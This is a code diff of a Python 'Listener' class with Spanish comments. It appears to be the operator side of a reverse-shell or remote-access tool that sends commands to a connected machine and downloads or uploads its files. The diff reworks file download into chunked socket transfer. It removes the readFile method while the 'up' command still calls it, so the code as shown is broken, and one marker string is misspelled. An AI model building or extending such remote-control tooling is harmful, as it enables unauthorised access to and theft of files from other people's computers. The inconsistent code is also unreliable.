@@ -1,9 +1,8 @@
-import base64
 import socket
 import json
 import optparse
 import os
-import tqdm
+import struct
 
 def getArguments():
     parser = optparse.OptionParser()
@@ -50,24 +49,48 @@ class Listener:
             except ValueError: 
                 print('Está ocurriendo un error')
                 continue'''
-            jsonData = self.connection.recv(4096)                
+            jsonData = self.connection.recv(4096)
             return json.loads(jsonData)
 
-    def writeFile(self, path, route, content):
-        path = os.path.basename(path)
-        contentToWrite = base64.b64decode(content)
-        if contentToWrite != b'[-]Archivo no encontrado':
-            with open(f'{route}{path}', 'wb') as file:
-                file.write(contentToWrite)
-                return '[+]Descarga completa'
-        else: return '[-]Descarga fallida'
+    def receive_file_size(self, sck: socket.socket):
+        # Esta función se asegura de que se reciban los bytes
+        # que indican el tamaño del archivo que será enviado,
+        # que es codificado por el cliente vía struct.pack(),
+        # función la cual genera una secuencia de bytes que
+        # representan el tamaño del archivo.
+        fmt = "<Q"
+        expected_bytes = struct.calcsize(fmt)
+        received_bytes = 0
+        stream = bytes()
+        while received_bytes < expected_bytes:
+            chunk = sck.recv(expected_bytes - received_bytes)
+            stream += chunk
+            received_bytes += len(chunk)
+        filesize = struct.unpack(fmt, stream)[0]
+        return filesize
 
-    def readFile(self, path):
-        try:
-            with open(path, 'rb') as file:
-                return base64.b64encode(file.read())
-        except FileNotFoundError:
-            return base64.b64encode(b'[-]Archivo no encontrado')
+    def receive_file(self, sck: socket.socket, filename, route):
+        # Leer primero del socket la cantidad de 
+        # bytes que se recibirán del archivo.
+        filesize = self.receive_file_size(sck)
+        # Abrir un nuevo archivo en donde guardar
+        # los datos recibidos.
+        filename = os.path.basename(filename)
+        with open(f'{route}{filename}', "wb") as f:
+            mensaje = '[+]Archivo descargado con éxito'
+            received_bytes = 0
+            # Recibir los datos del archivo en bloques de
+            # 1024 bytes hasta llegar a la cantidad de
+            # bytes total informada por el cliente.
+            while received_bytes < filesize:
+                chunk = sck.recv(1024)
+                if chunk and not (b'no encononontrado' in chunk):                    
+                    f.write(chunk)
+                    received_bytes += len(chunk)
+                else:
+                    mensaje = '[-]Descarga fallida o archivo no encontrado'
+                    break
+            print(mensaje)
     
     def remoteAction(self, command):
         self.reliableSend(command)
@@ -83,8 +106,9 @@ class Listener:
                 command = command.split(' ')                
 
                 if command[0] == 'down':
-                    contentFile = self.remoteAction(command)
-                    result = self.writeFile(' '.join(command[2:]), command[1], contentFile)
+                    self.reliableSend(command)
+                    self.receive_file(self.connection, ' '.join(command[2:]), command[1])
+                    result = ''
 
                 elif command[0] == 'up':
                     contentFile = self.readFile(' '.join(command[2:]))
